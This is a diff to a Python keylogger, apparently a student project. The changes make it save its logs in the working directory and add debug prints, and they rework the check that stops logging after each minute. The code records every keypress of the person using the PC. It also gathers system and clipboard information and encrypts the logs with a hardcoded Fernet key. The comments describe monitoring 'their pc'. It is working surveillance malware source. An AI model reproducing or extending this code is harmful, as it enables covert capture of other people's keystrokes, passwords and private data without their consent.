@@ -3,12 +3,14 @@ import time
 import schedule
 import keylog
 from cryptography.fernet import Fernet
+import os
 
 count = 0
 keys = []
 
 key_log = "log.txt"
-file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
+# get file path of the files 
+file_path = os.getcwd()
 extend = "\\"
 
 # variable declarations for system info
@@ -43,6 +45,7 @@ def keylogged(oldtime):
         # debugging purposes
         print("{0} pressed".format(key))
         currTime = time.time()
+        print("currtime: " + str(currTime) )
 
         if count > 0:
             count = 0
@@ -64,15 +67,17 @@ def keylogged(oldtime):
 
 
     def on_release(key):
+        # calculating if a minute has passed by getting the current time and subtracting the time 
+        sub = currTime - oldtime
         # debugging print statements
-        #print("on release: ")
-        #print(oldtime)
-        #print (" ")
-        # print("on release" + str(currTime) )
+        #print("subbed time: " + str(sub) )
         if key == Key.esc:
             return False
         # check if a minute has passed
-        if ( currTime - oldtime > 59 ):
+        if ( sub > 59 ):
+            # debugging print statements
+            # print("check currtime: " + str(currTime) + "\n")
+            # print("check oldtime: " + str(oldtime) )
             return False
 
     ## on_press = key is press on_release = key is released
@@ -107,7 +112,7 @@ def main():
     # variable to keep track of how many minutes we monitor their pc
     minutes = 1
 
-    # key for encrypting
+    # key for encrypting, key is given through the key generator file
     key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="
 
     # will continue to read the users computer for specified minutes
@@ -122,17 +127,14 @@ def main():
             file.write(" ")
         
         oldtime = time.time()
-        #print("before sleep time: " + str(oldtime) )
+        print("oldtime " + str(oldtime) )
 
+        # performing key log actions
         keylogged(oldtime)
-        
-        # debugging print statements
-        #newtime = time.time()
-        #print("\n")
-        #print("after sleep time: " + str(newtime) )
         
         # increment counter
         countMin += 1
+        # debug print statement to count how many minutes have passed
         print(countMin)
     
     files = [file_path + extend + system_info, file_path + extend + clipboard_info, file_path + extend + key_log]
